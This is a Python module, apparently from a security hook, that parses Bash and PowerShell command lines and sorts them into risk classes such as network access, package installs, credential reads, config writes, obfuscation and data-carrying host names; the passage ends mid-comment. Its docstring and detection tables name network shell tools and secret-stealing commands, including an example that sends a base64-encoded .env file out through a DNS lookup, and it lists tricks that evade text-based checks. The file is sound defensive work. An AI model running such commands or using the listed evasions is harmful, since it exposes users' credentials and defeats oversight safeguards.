"""Shell commands: what a Bash or PowerShell command line runs, sorted into broad classes.

The Claude Code hook sees a Bash (or PowerShell) call as one text. This
module reads that text roughly the way the shell would: it splits it into
simple commands (at ;, &&, ||, |, &, newlines, and the commands inside
$( ), backticks, <( ) and >( )), finds each one's program and words, and
says which of these classes the command line falls into:

    network       talks to another machine: curl, wget, nc, ssh, scp, rsync, ping, nslookup,
                  dig, Invoke-WebRequest, certutil -urlcache, git push/clone/fetch/pull, npm
                  publish, gh, a Bash /dev/tcp or /dev/udp redirection ...
    install       installs or runs code from a registry or the web: npm/pnpm/yarn install or
                  add, pip install, uv pip install, npx, uvx, pipx run, deno run <url>, a
                  download piped to a shell, iex
    secret_read   names a credential file or an agent's configuration (cat .env, cat
                  ~/.aws/credentials), or prints the environment (env, printenv, set, Get-ChildItem env:)
    config_write  writes to such a file: a redirect (> or >>), tee, cp, mv, Set-Content,
                  Out-File, [IO.File]::WriteAllText ... with an agent's configuration, a
                  credential file or the PowerShell profile ($PROFILE) as a target
    obfuscation   hides what runs: base64 -d piped to a shell, powershell -EncodedCommand,
                  eval, iex, bash -c with a $( ) in its command
    encoded_host  a host name that carries data: a label of 32 or more characters, one that
                  looks like hex or base32, or one built from a command's output
                  (ping $(cat .env | base64).x.example)

A command that cannot be read with certainty is "unreadable": an unclosed
quote or $( ), a heredoc or here-string, ANSI-C quoting ($'...'), a program
chosen at run time ($c args, PowerShell's & $c, & (...) and . (...)), a program
name with a wildcard or a brace expansion (/???/cur?, {curl,x}), more than
MAX_SEGMENTS commands, more than MAX_COMMAND_CHARS characters, deeper nesting
than MAX_DEPTH, or a control character. The policy decides what happens to it
(see CommandRule).

This raises the bar; it is not a boundary. A shell can reach the same ends in
ways no text reading follows: variables and aliases set earlier (c=curl in an
earlier call), functions, scripts, python -c, node -e, Invoke-Expression of a
string built at run time, globs in arguments (cat .e*), and programs this list
does not name. Nothing here runs anything or touches the file system or the network.
"""

from __future__ import annotations

import functools
import posixpath
import re
from dataclasses import dataclass
from typing import Any, Iterable, Iterator

from .templates import AGENT_CONFIG_PATTERN, AGENT_SENTINEL_HOME_PATTERN, CREDENTIAL_PATTERN, ROUNDABOUT_PATH_PATTERN
from .textutil import printable

NETWORK = "network"
INSTALL = "install"
SECRET_READ = "secret_read"
CONFIG_WRITE = "config_write"
OBFUSCATION = "obfuscation"
ENCODED_HOST = "encoded_host"
CLASSES = (NETWORK, INSTALL, SECRET_READ, CONFIG_WRITE, OBFUSCATION, ENCODED_HOST)
# What each class means, for the operator (validate, explain).
CLASS_TEXT = {
    NETWORK: "talks to another machine",
    INSTALL: "installs or runs code from a package registry or the web",
    SECRET_READ: "reads a credential file or an agent's configuration, or prints the environment",
    CONFIG_WRITE: "writes to an agent's configuration or a credential file",
    OBFUSCATION: "hides what it runs (decoded or evaluated text)",
    ENCODED_HOST: "names a host that looks like it carries data",
}
# allow_programs can lift these classes for one program; the others are about words, not programs.
PROGRAM_CLASSES = (NETWORK, INSTALL)
SHELLS = ("bash", "powershell")
UNREADABLE = "unreadable"

MAX_COMMAND_CHARS = 8 * 1024
MAX_SEGMENTS = 64
MAX_DEPTH = 6  # $( ) inside $( ), bash -c inside bash -c, ...
_MAX_WRAPPERS = 8  # sudo nohup env ... before the program
_READINGS_KEPT = 64  # read_command's cache

# Stands for the output of a command substitution inside a word. A control
# character, so it cannot come from the command itself (those are refused).
_SUBST = "\x00"
# Stands for a PowerShell ( ) group in an argument ("Set-Content ('x') y"), as a word of its own.
_GROUP = "\x01"


class Unreadable(Exception):
    """A command that cannot be read with certainty. The message says why, for the operator."""


@dataclass(frozen=True)
class Finding:
    """One class found in a command line, and where."""

    kind: str  # one of CLASSES
    program: str  # the program of the simple command it was found in ("" when none)
    words: tuple[str, ...]  # that command's first words, lowercased, for allow_programs
    evidence: str  # what was seen, made printable: "program 'curl'", "word '.env'"


@dataclass(frozen=True)
class Reading:
    """What a command line does: the classes found, or why it could not be read."""

    findings: tuple[Finding, ...] = ()
    unreadable: str | None = None

    def kinds(self) -> frozenset[str]:
        return frozenset(finding.kind for finding in self.findings)


def read_command(text: str, shell: str = "bash") -> Reading:
    """Read one command line (see the module docstring). Never raises for any text."""
    if not isinstance(text, str):
        return Reading(unreadable="the command is not text")
    if shell not in SHELLS:
        raise ValueError(f"unknown shell {shell!r}")
    if len(text) > MAX_COMMAND_CHARS:
        return Reading(unreadable=f"it is longer than {MAX_COMMAND_CHARS} characters")
    return _cached_reading(text, shell)


@functools.lru_cache(maxsize=_READINGS_KEPT)
def _cached_reading(text: str, shell: str) -> Reading:
    # The same command is read for the verdict, for the flow labels and for the marks: once is enough.
    if any(ch < " " and ch not in "\t\r\n" or ch == "\x7f" for ch in text):
        return Reading(unreadable="it holds a control character")
    try:
        commands = _read(text, shell, _Budget(), 0)
        return Reading(tuple(_findings(commands)))
    except Unreadable as exc:
        return Reading(unreadable=str(exc))
    except Exception as exc:  # a tokenizer error, or a spelling this reader gets wrong: not read, so not trusted
        return Reading(unreadable=f"the command could not be split into words ({type(exc).__name__})")


# ---- splitting a command line --------------------------------------------------------------

class _Budget:
    """The simple commands found so far in one command line, nested ones included, against MAX_SEGMENTS."""

    def __init__(self) -> None:
        self.segments = 0
        self.pipelines = 0  # pipelines numbered so far: each gets its own number, nested ones too

    def spend(self) -> None:
        self.segments += 1
        if self.segments > MAX_SEGMENTS:
            raise Unreadable(f"it holds more than {MAX_SEGMENTS} commands")

    def next_pipeline(self) -> int:
        self.pipelines += 1
        return self.pipelines


@dataclass(frozen=True)
class _Command:
    """One simple command: its program, its words and where its output is written."""

    program: str  # basename, lowercased, without .exe/.cmd/.bat/.ps1; "" for none
    words: tuple[str, ...]  # the words after the program, quotes removed
    targets: tuple[str, ...]  # targets of > and >> (and of PowerShell's redirections)
    shell: str
    pipeline: int  # commands of one pipeline share this number
    position: int  # place in the pipeline: 0 is the first
    written: str = ""  # the program's word as written
    groups: tuple[str, ...] = ()  # PowerShell: the words of its ( ), $( ) and @( ) arguments


# A segment of a pipeline: a simple command's text (quotes kept), and the texts of its PowerShell groups.
_Segment = tuple[str, tuple[str, ...]]


def _read(text: str, shell: str, budget: _Budget, depth: int) -> list[_Command]:
    """Every simple command of `text`, nested ones included (and the ones bash -c and the like run)."""
    if depth > MAX_DEPTH:
        raise Unreadable("it nests commands more deeply than is followed")
    splitter = _BashSplitter if shell == "bash" else _PowerShellSplitter
    pipelines = splitter(text, budget, depth).split()
    commands: list[_Command] = []
    for pipeline in pipelines:
        number = budget.next_pipeline()
        for position, (segment, groups) in enumerate(pipeline):
            words, targets = _bash_words(segment) if shell == "bash" else _powershell_words(segment)
            for command in _simple_commands(words, targets, shell, number, position, _group_words(groups)):
                commands.append(command)
                commands.extend(_inner_commands(command, budget, depth))
    return commands


def _group_words(groups: tuple[str, ...]) -> tuple[str, ...]:
    """The words inside a command's PowerShell groups, split at commas and brackets too ('a','b' is a list)."""
    found: list[str] = []
    for body in groups:
        words, targets = _powershell_words(body)
        for word in (*words, *targets):
            found.extend(part for part in re.split(r"[(),]+", word) if part)
    return tuple(found)


class _Splitter:
    """What the Bash and PowerShell splitters share: the pipelines being built, and nested commands."""

    def __init__(self, text: str, budget: _Budget, depth: int) -> None:
        self.text = text
        self.budget = budget
        self.depth = depth
        self.pipelines: list[list[_Segment]] = []
        self.pipeline: list[_Segment] = []
        self.current: list[str] = []
        self.groups: list[str] = []  # the current command's PowerShell group texts
        self.last = ""  # the last character of the current command that is not a space ("" for none yet)
        self.open = 0  # "(" (and in PowerShell "{") not yet closed

    def push(self, piece: str) -> None:
        """Add text to the current command (keeping `last` up to date, so no check has to join it all)."""
        self.current.append(piece)
        visible = piece.rstrip()
        if visible:
            self.last = visible[-1]

    def end_command(self) -> None:
        segment = "".join(self.current).strip()
        self.current.clear()
        self.last = ""
        groups = tuple(self.groups)
        self.groups.clear()
        if segment:
            self.budget.spend()
            self.pipeline.append((segment, groups))

    def end_pipeline(self) -> None:
        self.end_command()
        if self.pipeline:
            self.pipelines.append(self.pipeline)
            self.pipeline = []

    def at_word_start(self) -> bool:
        return not self.current or self.current[-1][-1:].isspace()

    def ends_with_redirection(self) -> bool:
        """True if the current command's text ends with ">" (so a "&" next is part of >& or 2>&1)."""
        return bool(self.current) and self.current[-1].endswith(">")

    def nested(self, body: str, shell: str) -> None:
        """A command inside this one ($( ), backticks ...): its pipelines are read as pipelines of their own."""
        self.pipelines.extend(_nested_splitter(shell)(body, self.budget, self.depth + 1).split())
        self.push(_SUBST)

    def opened(self) -> None:
        self.open += 1
        self.end_pipeline()

    def closed(self) -> None:
        self.open -= 1
        if self.open < 0:
            raise Unreadable("a closing bracket has no opening one")
        self.end_pipeline()

    def finish(self) -> list[list[_Segment]]:
        if self.open:
            raise Unreadable("a bracket is not closed")
        self.end_pipeline()
        return self.pipelines


def _nested_splitter(shell: str) -> type:
    if shell == "bash":
        return _BashSplitter
    return _PowerShellSplitter


class _BashSplitter(_Splitter):
    """Split a Bash command line into pipelines of simple commands (each still a text, quotes kept)."""

    def __init__(self, text: str, budget: _Budget, depth: int) -> None:
        if depth > MAX_DEPTH:
            raise Unreadable("it nests commands more deeply than is followed")
        super().__init__(text, budget, depth)

    def split(self) -> list[list[_Segment]]:
        text, i, n = self.text, 0, len(self.text)
        while i < n:
            c = text[i]
            nxt = text[i + 1:i + 2]
            if c == "\\":
                if not nxt:
                    raise Unreadable("it ends with a backslash")
                if nxt != "\n":  # a backslash before a newline joins the lines
                    self.push(text[i:i + 2])
                i += 2
            elif c == "'":
                end = text.find("'", i + 1)
                if end < 0:
                    raise Unreadable("a quote is not closed")
                self.push(text[i:end + 1])
                i = end + 1
            elif c == '"':
                i = self.double_quoted(i)
            elif c == "$" and nxt == "(":
                body, i = _bash_closing_paren(text, i + 2, self.depth)
                self.nested(body, "bash")
            elif c == "$" and nxt == "'":
                raise Unreadable("ANSI-C quoting ($'...') can spell any program or file name")
            elif c == "$" and nxt == "{":
                i = self.parameter(i)
            elif c == "`":
                body, i = _bash_backticks(text, i + 1)
                self.nested(body, "bash")
            elif c in "<>" and nxt == "(":
                body, i = _bash_closing_paren(text, i + 2, self.depth)
                self.nested(body, "bash")
            elif c == "<" and nxt == "<":
                raise Unreadable("a heredoc or here-string (<<) holds text that is not read")
            elif c == "#" and self.at_word_start():
                end = text.find("\n", i)
                i = n if end < 0 else end
            elif c in ";\n":
                self.end_pipeline()
                i += 1
            elif c == "|":
                if nxt == "|":
                    self.end_pipeline()
                    i += 2
                else:
                    self.end_command()
                    i += 2 if nxt == "&" else 1
            elif c == "&":
                if nxt == "&":
                    self.end_pipeline()
                    i += 2
                elif nxt == ">" or self.ends_with_redirection():
                    self.push(c)  # &> and >& are redirections
                    i += 1
                else:
                    self.end_pipeline()  # a command run in the background
                    i += 1
            elif c == "(":
                self.opened()
                i += 1
            elif c == ")":
                self.closed()
                i += 1
            else:
                self.push(c)
                i += 1
        return self.finish()

    def double_quoted(self, start: int) -> int:
        """Copy a "..." text, reading the $( ) and backticks inside it as commands. The index after it."""
        text, i, n = self.text, start + 1, len(self.text)
        parts = ['"']
        while i < n:
            c = text[i]
            if c == "\\" and i + 1 < n:
                parts.append(text[i:i + 2])
                i += 2
            elif c == '"':
                parts.append('"')
                self.push("".join(parts))
                return i + 1
            elif c == "$" and text[i + 1:i + 2] == "(":
                body, i = _bash_closing_paren(text, i + 2, self.depth)
                self.nested(body, "bash")
                parts.append(self.current.pop())
            elif c == "`":
                body, i = _bash_backticks(text, i + 1)
                self.nested(body, "bash")
                parts.append(self.current.pop())
            else:
                parts.append(c)
                i += 1
        raise Unreadable("a quote is not closed")

    def parameter(self, start: int) -> int:
        """Copy a ${...}, reading any $( ) inside it ("${x:-$(curl ...)}") as a command."""
        text, i, n = self.text, start + 2, len(self.text)
        parts = ["${"]
        open_braces = 1
        while i < n:
            c = text[i]
            if c == "\\" and i + 1 < n:
                parts.append(text[i:i + 2])
                i += 2
                continue
            if c == "$" and text[i + 1:i + 2] == "(":
                body, i = _bash_closing_paren(text, i + 2, self.depth)
                self.nested(body, "bash")
                parts.append(self.current.pop())
                continue
            if c == "`":
                body, i = _bash_backticks(text, i + 1)
                self.nested(body, "bash")
                parts.append(self.current.pop())
                continue
            if c == "{":
                open_braces += 1
            elif c == "}":
                open_braces -= 1
                if open_braces == 0:
                    parts.append("}")
                    self.push("".join(parts))
                    return i + 1
            parts.append(c)
            i += 1
        raise Unreadable("a '${' is not closed")


def _bash_closing_paren(text: str, start: int, depth: int) -> tuple[str, int]:
    """The body of a $( ) (or <( ), >( )) that starts at `start`, and the index after its ")"."""
    if depth > MAX_DEPTH:
        raise Unreadable("it nests commands more deeply than is followed")
    i, n, open_parens = start, len(text), 1
    while i < n:
        c = text[i]
        if c == "\\":
            i += 2
        elif c == "'":
            end = text.find("'", i + 1)
            if end < 0:
                raise Unreadable("a quote is not closed")
            i = end + 1
        elif c == '"':
            i = _bash_skip_double_quoted(text, i + 1, depth + 1)
        elif c == "`":
            i = _bash_backticks(text, i + 1)[1]
        else:
            if c == "(":
                open_parens += 1
            elif c == ")":
                open_parens -= 1
                if open_parens == 0:
                    return text[start:i], i + 1
            i += 1
    raise Unreadable("a '$(' is not closed")


def _bash_skip_double_quoted(text: str, start: int, depth: int) -> int:
    """The index after the "..." whose text starts at `start` (its own $( ) skipped whole)."""
    i, n = start, len(text)
    while i < n:
        c = text[i]
        if c == "\\":
            i += 2
        elif c == '"':
            return i + 1
        elif c == "$" and text[i + 1:i + 2] == "(":
            i = _bash_closing_paren(text, i + 2, depth + 1)[1]
        elif c == "`":
            i = _bash_backticks(text, i + 1)[1]
        else:
            i += 1
    raise Unreadable("a quote is not closed")


def _bash_backticks(text: str, start: int) -> tuple[str, int]:
    """The body of a `...` that starts at `start`, and the index after the closing backtick."""
    i, n = start, len(text)
    while i < n:
        if text[i] == "\\":
            i += 2
        elif text[i] == "`":
            return text[start:i], i + 1
        else:
            i += 1
    raise Unreadable("a backtick is not closed")


class _PowerShellSplitter(_Splitter):
    """Split a PowerShell command line into pipelines of simple commands.

    $( ), @( ), ( ) and { } blocks are read as commands of their own; so are
    script blocks ({ ... } after ForEach-Object, Invoke-Command ...). A ( ),
    $( ) or @( ) in an argument ("Set-Content ('.claude\\settings.json') x")
    is also kept with the command it is in: its words are the command's
    `groups`, and a ( ) leaves the word _GROUP in its place. The program
    after the call operator & or a dot-source . must be a name: "& (gcm iwr)"
    and ". (gcm iwr)" choose it when the command runs.
    """

    def __init__(self, text: str, budget: _Budget, depth: int) -> None:
        if depth > MAX_DEPTH:
            raise Unreadable("it nests commands more deeply than is followed")
        super().__init__(text, budget, depth)
        self.calling = False  # the last thing seen was the call operator & or a dot-source "."

    def end_command(self) -> None:
        self.calling = False
        super().end_command()

    def at_statement_start(self) -> bool:
        """True where a program name may come: nothing before it yet, or only an assignment ("$x = ")."""
        return self.last in ("", "=")

    def split(self) -> list[list[_Segment]]:
        text, i, n = self.text, 0, len(self.text)
        while i < n:
            c = text[i]
            nxt = text[i + 1:i + 2]
            if self.calling and not c.isspace():
                self.calling = False
                if c == "(":
                    raise Unreadable("the program is chosen when the command runs (& or . before a ( ) group)")
            if c == "`":  # PowerShell's escape character
                if not nxt:
                    raise Unreadable("it ends with a backtick")
                if nxt in "\r\n":  # a line continuation
                    i += 3 if text[i + 1:i + 3] == "\r\n" else 2
                else:
                    self.push(text[i:i + 2])
                    i += 2
            elif c == "'":
                end = _powershell_single_quote_end(text, i)
                self.push(text[i:end])
                i = end
            elif c == '"':
                i = self.double_quoted(i)
            elif c == "@" and nxt in ("'", '"'):
                raise Unreadable("a here-string (@' or @\") holds text that is not read")
            elif c in "$@" and nxt == "(":
                body, i = _powershell_closing(text, i + 2, self.depth)
                self.nested(body, "powershell")
                self.groups.append(body)
            elif c == "<" and nxt == "#":
                end = text.find("#>", i + 2)
                if end < 0:
                    raise Unreadable("a <# comment is not closed")
                i = end + 2
            elif c == "#" and self.at_word_start():
                end = text.find("\n", i)
                i = n if end < 0 else end
            elif c in ";\n":
                self.end_pipeline()
                i += 1
            elif c == "|":
                if nxt == "|":
                    self.end_pipeline()
                    i += 2
                else:
                    self.end_command()
                    i += 1
            elif c == "&":
                if nxt == "&":
                    self.end_pipeline()
                    i += 2
                elif self.ends_with_redirection():
                    self.push(c)  # part of 2>&1
                    i += 1
                elif self.at_statement_start():
                    self.push("& ")  # the call operator, a word of its own even in &"curl" or &iwr
                    self.calling = True
                    i += 1
                else:
                    self.end_pipeline()  # a background job
                    i += 1
            elif c == "." and self.at_statement_start() and nxt[:1].isspace():
                self.push(c)  # dot-sourcing: ". iwr x" runs iwr
                self.calling = True
                i += 1
            elif c == "(" and not self.at_statement_start():
                # A group in an argument: read as commands, and its words kept with this command.
                body, i = _powershell_closing(text, i + 1, self.depth)
                self.pipelines.extend(_PowerShellSplitter(body, self.budget, self.depth + 1).split())
                self.groups.append(body)
                self.push(f" {_GROUP} ")
            elif c in "({":
                self.opened()
                i += 1
            elif c in ")}":
                self.closed()
                i += 1
            else:
                self.push(c)
                i += 1
        return self.finish()

    def double_quoted(self, start: int) -> int:
        text, i, n = self.text, start + 1, len(self.text)
        parts = ['"']
        while i < n:
            c = text[i]
            if c == "`" and i + 1 < n:
                parts.append(text[i:i + 2])
                i += 2
            elif c == '"':
                if text[i + 1:i + 2] == '"':  # "" is a quote inside the text
                    parts.append('""')
                    i += 2
                    continue
                parts.append('"')
                self.push("".join(parts))
                return i + 1
            elif c == "$" and text[i + 1:i + 2] == "(":
                body, i = _powershell_closing(text, i + 2, self.depth)
                self.nested(body, "powershell")
                self.groups.append(body)
                parts.append(self.current.pop())
            else:
                parts.append(c)
                i += 1
        raise Unreadable("a quote is not closed")


def _powershell_single_quote_end(text: str, start: int) -> int:
    """The index after a '...' text that starts at `start` ('' inside it is a quote)."""
    i = start + 1
    while True:
        end = text.find("'", i)
        if end < 0:
            raise Unreadable("a quote is not closed")
        if text[end + 1:end + 2] == "'":
            i = end + 2
            continue
        return end + 1


def _powershell_closing(text: str, start: int, depth: int) -> tuple[str, int]:
    """The body of a PowerShell $( ) or @( ) that starts at `start`, and the index after its ")"."""
    if depth > MAX_DEPTH:
        raise Unreadable("it nests commands more deeply than is followed")
    i, n, open_parens = start, len(text), 1
    while i < n:
        c = text[i]
        if c == "`":
            i += 2
        elif c == "'":
            i = _powershell_single_quote_end(text, i)
        elif c == '"':
            i = _powershell_skip_double_quoted(text, i + 1, depth + 1)
        else:
            if c == "(":
                open_parens += 1
            elif c == ")":
                open_parens -= 1
                if open_parens == 0:
                    return text[start:i], i + 1
            i += 1
    raise Unreadable("a '$(' is not closed")


def _powershell_skip_double_quoted(text: str, start: int, depth: int) -> int:
    i, n = start, len(text)
    while i < n:
        c = text[i]
        if c == "`":
            i += 2
        elif c == '"':
            if text[i + 1:i + 2] == '"':
                i += 2
                continue
            return i + 1
        elif c == "$" and text[i + 1:i + 2] == "(":
            i = _powershell_closing(text, i + 2, depth + 1)[1]
        else:
            i += 1
    raise Unreadable("a quote is not closed")


# ---- words ---------------------------------------------------------------------------------

# A redirection operator on its own (shlex keeps them apart from words): >, >>, &>, >|, 2>, *> ...
_REDIRECT = re.compile(r"([0-9]*|\*|&)>>?[|&]?")


def _bash_words(segment: str) -> tuple[list[str], list[str]]:
    """The words of one Bash simple command (quotes removed, by shlex), and its output targets."""
    import shlex  # here, not at the top: importing the library must not load it (the hook starts often)

    lexer = shlex.shlex(segment, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    lexer.commenters = ""
    try:
        tokens = list(lexer)
    except ValueError as exc:  # "No closing quotation", "No escaped character"
        raise Unreadable(f"it cannot be split into words ({exc})") from None
    return _redirections(tokens, attached=False)


def _redirections(tokens: list[str], attached: bool) -> tuple[list[str], list[str]]:
    """Separate the output targets (the word after > or >>) from the words; drop the operators.

    attached: PowerShell words, where the target may be in the same word (">file", "2>file").
    """
    words: list[str] = []
    targets: list[str] = []
    expect_target = False
    for token in tokens:
        if expect_target:
            expect_target = False
            if not re.fullmatch(r"[0-9-]+", token):  # >&2 and >&- name a stream, not a file
                targets.append(token)
            continue
        operator = _REDIRECT.fullmatch(token)
        if operator or token in ("<", "<&"):
            if words and words[-1].isdigit() and operator:
                words.pop()  # "2" of "2>": shlex splits it off
            expect_target = token not in ("<", "<&")
            continue
        found = re.match(r"(?:[0-9]*|\*)>>?", token) if attached else None
        if found and found.end() < len(token):
            targets.append(token[found.end():])
            continue
        words.append(token)
    return words, targets


def _powershell_words(segment: str) -> tuple[list[str], list[str]]:
    """The words of one PowerShell simple command (quotes and backtick escapes removed), and its targets."""
    words: list[str] = []
    current: list[str] = []
    started = False
    i, n = 0, len(segment)
    while i < n:
        c = segment[i]
        if c.isspace():
            if started:
                words.append("".join(current))
                current, started = [], False
            i += 1
            continue
        started = True
        if c == "`" and i + 1 < n:
            current.append(segment[i + 1])
            i += 2
        elif c == "'":
            end = _powershell_single_quote_end(segment, i)
            current.append(segment[i + 1:end - 1].replace("''", "'"))
            i = end
        elif c == '"':
            i += 1
            while i < n and not (segment[i] == '"' and segment[i + 1:i + 2] != '"'):
                if segment[i] in '`"' and i + 1 < n:
                    current.append(segment[i + 1])
                    i += 2
                else:
                    current.append(segment[i])
                    i += 1
            i += 1
        else:
            current.append(c)
            i += 1
    if started:
        words.append("".join(current))
    return _redirections(words, attached=True)


# ---- simple commands -----------------------------------------------------------------------

# Words that start a Bash compound command or a group, and come before its first program.
# ("time" is a wrapper below, so that its option -p is not taken for the program.)
_KEYWORDS = frozenset({"if", "then", "else", "elif", "fi", "do", "done", "while", "until", "{", "}", "!",
                       "coproc", "[[", "]]", "function"})
# Commands whose words are not a program to run: a loop header lists values.
_HEADERS = frozenset({"for", "select", "case", "in", "esac"})
_ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]*(\[[^\]]*\])?\+?=")
# Programs that run the program named after them, and their options that take a value.
_WRAPPERS: dict[str, frozenset[str]] = {
    "sudo": frozenset({"-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "--user", "--group"}),
    "doas": frozenset({"-u", "-C"}),
    "nohup": frozenset(),
    "nice": frozenset({"-n", "--adjustment"}),
    "ionice": frozenset({"-c", "-n", "-p"}),
    "time": frozenset({"-f", "-o"}),
    "timeout": frozenset({"-s", "-k", "--signal", "--kill-after"}),
    "exec": frozenset({"-a"}),
    "command": frozenset(),
    "builtin": frozenset(),
    "env": frozenset({"-u", "-C", "--unset", "--chdir"}),
    "xargs": frozenset({"-I", "-n", "-P", "-d", "-E", "-L", "-s", "-a", "--max-args", "--max-procs",
                        "--delimiter", "--arg-file"}),
    "stdbuf": frozenset({"-i", "-o", "-e"}),
    "setsid": frozenset(),
    "unbuffer": frozenset(),
    "strace": frozenset({"-o", "-e", "-p", "-s"}),
    "watch": frozenset({"-n", "-d", "--interval"}),
    "busybox": frozenset(),  # busybox wget ...
    "corepack": frozenset(),  # corepack pnpm add ...
    "chroot": frozenset({"--userspec", "--groups"}),  # then the new root folder
    "flock": frozenset({"-w", "--wait", "--timeout", "-E", "--conflict-exit-code"}),  # then the lock file
    "parallel": frozenset({"-j", "--jobs", "-S", "--sshlogin", "-a", "--arg-file", "--delay", "-n", "-N",
                           "--max-args", "-I", "--timeout", "--joblog", "--results", "-d", "--delimiter", "-E"}),
    "&": frozenset(),  # PowerShell's call operator
    ".": frozenset(),  # PowerShell's dot-sourcing (only there: in Bash "." reads a script file)
    "call": frozenset(),  # cmd
    "start": frozenset(),  # cmd
    "start-process": frozenset({"-argumentlist", "-workingdirectory", "-verb", "-windowstyle", "-credential",
                                "-redirectstandardoutput", "-redirectstandardinput", "-redirectstandarderror"}),
    "saps": frozenset({"-argumentlist", "-workingdirectory", "-verb", "-windowstyle"}),
}
# Wrappers followed by one word that is not the program: timeout's duration, chroot's root, flock's lock file.
_WRAPPERS_WITH_A_VALUE = frozenset({"timeout", "chroot", "flock"})
_STRIPPED_EXTENSIONS = (".exe", ".cmd", ".bat", ".ps1")
# What makes Bash expand a program's name into another one: *, ?, {a,b} or {a..b}; and [...], which
# _check_program_word looks for without a pattern (a pattern would scan the rest of the word from every "[").
_BASH_PATTERN = re.compile(r"[*?]|\{[^{}]*(,|\.\.)[^{}]*\}")


def _program_name(word: str) -> str:
    """The program a word names: its last path part, lowercased, without .exe/.cmd/.bat/.ps1."""
    name = _last_part(word).lower()
    for extension in _STRIPPED_EXTENSIONS:
        if name.endswith(extension) and len(name) > len(extension):
            return name[:-len(extension)]
    return name


def _last_part(word: str) -> str:
    return re.split(r"[\\/]", word)[-1]


def _runtime_chosen(word: str) -> bool:
    """True if the word that names the program holds a variable, a command's output or a ( ) group."""
    return _SUBST in word or _GROUP in word or "$" in word or "`" in word


def _check_program_word(word: str, shell: str) -> None:
    """Refuse (Unreadable) a program word whose program is only known when the command runs.

    A word with spaces in it was quoted: a path with spaces ("C:\\Program
    Files\\x\\curl.exe"), or a command text that env -S, watch and the like
    run, which _inner_commands reads as a command line too. Its folders may hold
    a variable ("$DIR/tool"), but not its last part; quoted, it holds no wildcards.
    """
    if any(ch.isspace() for ch in word):
        if _runtime_chosen(_last_part(word)):
            raise Unreadable("the program is chosen when the command runs (a variable or a command's output)")
        return
    if _runtime_chosen(word):
        raise Unreadable("the program is chosen when the command runs (a variable or a command's output)")
    if shell == "powershell":
        wildcard = "*" in word or "?" in word and word != "?"  # "?" alone is Where-Object
    else:
        bracket = word.find("[")
        wildcard = bool(_BASH_PATTERN.search(word)) or bracket >= 0 and word.find("]", bracket + 1) > 0
    if wildcard:
        # /???/cur? and {curl,x} are curl to the shell.
        raise Unreadable("the program's name holds a wildcard or a brace expansion, which the shell expands")


def _simple_commands(words: list[str], targets: list[str], shell: str, pipeline: int,
                     position: int, groups: tuple[str, ...] = ()) -> list[_Command]:
    """The command (or commands) one segment runs: assignments, keywords and wrappers peeled off."""
    rest = list(words)
    if shell == "powershell":
        rest = _powershell_statement(rest)
    while rest and (_ASSIGNMENT.match(rest[0]) and shell == "bash" or rest[0] in _KEYWORDS):
        rest.pop(0)
        if shell == "powershell" and rest and rest[0] == _GROUP:
            rest.pop(0)  # the condition of if ( ... ) or while ( ... ), read as commands of its own

    def command(program: str, after: list[str], written: str = "") -> _Command:
        return _Command(program, tuple(after), tuple(targets), shell, pipeline, position, written, groups)

    if not rest:
        return [command("", [])] if targets or groups else []
    if rest[0] in _HEADERS:
        return [command("", rest[1:])]
    peeled = 0
    while rest:
        word = rest[0]
        if shell == "powershell" and peeled == 0 and (word[:1] in ("$", "[", "@") or word == _GROUP):
            # An expression ($x.Method(), [Type]::Call(), (...).Length), not a program to run.
            return [command("", rest)]
        _check_program_word(word, shell)
        name = _program_name(word)
        if name not in _WRAPPERS or peeled >= _MAX_WRAPPERS or (name == "." and shell != "powershell"):
            break
        after = _after_wrapper(name, rest[1:])
        if after is None:  # "env" alone, "command -v curl": the wrapper is the program
            break
        rest = after
        peeled += 1
    if not rest:
        return []
    return [command(_program_name(rest[0]), rest[1:], rest[0])]


def _powershell_statement(words: list[str]) -> list[str]:
    """Drop an assignment from the start of a PowerShell statement: "$x = iwr ..." runs iwr."""
    if len(words) >= 2 and words[0].startswith("$") and re.fullmatch(r"[-+*/%]?=", words[1]):
        return words[2:]
    if words and re.fullmatch(r"\$[\w:{}.]+[-+*/%]?=", words[0]):
        return words[1:]
    return words


def _after_wrapper(name: str, words: list[str]) -> list[str] | None:
    """The words from the wrapped program on, or None when the wrapper runs nothing itself.

    env -S 'curl x' and flock f -c 'curl x' give a command text as one word: it
    becomes the program word, which _inner_commands reads as a command line.
    """
    takes_value = _WRAPPERS[name]
    if name == "command" and words and words[0] in ("-v", "-V"):
        return None
    i = 0
    while i < len(words):
        word = words[i]
        lowered = word.lower()
        if name == "env" and _ASSIGNMENT.match(word):
            i += 1
        elif name == "env" and (word in ("-S", "--split-string") or word.startswith(("-S", "--split-string="))):
            # env -S 'curl x' splits the text into the program and its words.
            if word in ("-S", "--split-string"):
                return words[i + 1:] or None
            return [word[2:] if word.startswith("-S") else word.partition("=")[2], *words[i + 1:]]
        elif lowered.startswith("-") and lowered != "-":
            if name in ("start-process", "saps") and "-filepath".startswith(lowered) and len(lowered) > 1:
                return words[i + 1:] or None
            i += 2 if lowered in takes_value else 1
        else:
            break
    if name in _WRAPPERS_WITH_A_VALUE and i < len(words):
        i += 1  # the duration, the new root or the lock file
    if name == "flock" and words[i:i + 1] and words[i] in ("-c", "--command"):
        return words[i + 1:i + 2] or None  # flock f -c 'curl x'
    return words[i:] or None


def _inner_commands(command: _Command, budget: _Budget, depth: int) -> Iterator[_Command]:
    """Commands that this one runs from its words: bash -c, pwsh -Command, cmd /c, find -exec, a quoted program."""
    program, words = command.program, list(command.words)
    quoted_text = any(ch.isspace() for ch in command.written)
    if depth + 1 > MAX_DEPTH:
        if _shell_script(program, words) is not None or program == "find" or quoted_text:
            raise Unreadable("it nests commands more deeply than is followed")
        return
    script = _shell_script(program, words)
    if script is not None and _SUBST not in script[0]:
        # A script that is a command's output ("sh -c "$(curl ...)"") cannot be read: that command was
        # read already, and the shell running its output counts as obfuscation (and install after a download).
        text, shell = script
        yield from _read(text, shell, budget, depth + 1)
    if program == "find":
        for index, word in enumerate(words):
            if word in ("-exec", "-execdir", "-ok", "-okdir"):
                inner = []
                for part in words[index + 1:]:
                    if part in (";", "+"):
                        break
                    inner.append(part)
                budget.spend()
                for found in _simple_commands(inner, [], command.shell, budget.next_pipeline(), 0):
                    yield found
                    yield from _inner_commands(found, budget, depth + 1)
    if quoted_text:
        # A quoted program word with spaces: "C:\Program Files\x\curl.exe" (read above by its last part), or a
